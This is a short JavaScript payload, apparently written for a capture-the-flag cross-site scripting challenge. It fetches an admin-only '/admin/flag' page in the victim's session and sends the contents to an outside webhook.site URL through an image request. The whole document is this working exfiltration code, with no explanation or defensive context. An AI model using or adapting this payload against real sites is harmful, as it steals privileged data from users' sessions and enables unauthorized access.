fetch('/admin/flag')
  .then(r => r.text())
  .then(f => {
    new Image().src = 'https://webhook.site/f2f656c9-378e-4e8a-a77a-3f5e1387a4d6?x=' + encodeURIComponent(f);
  })
  .catch(e => console.error(e));
